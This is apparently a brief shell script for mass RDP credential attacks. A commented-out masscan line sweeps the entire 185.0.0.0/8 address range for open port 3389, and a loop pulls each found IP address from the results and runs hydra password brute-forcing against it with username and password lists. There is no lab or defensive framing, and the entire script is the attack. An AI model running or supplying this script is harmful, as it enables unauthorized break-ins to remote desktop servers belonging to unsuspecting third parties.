#sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do sleep 5 && hydra -vv rdp://$i -L user -P pass -t3 -W3 -I >hydra.log;
done
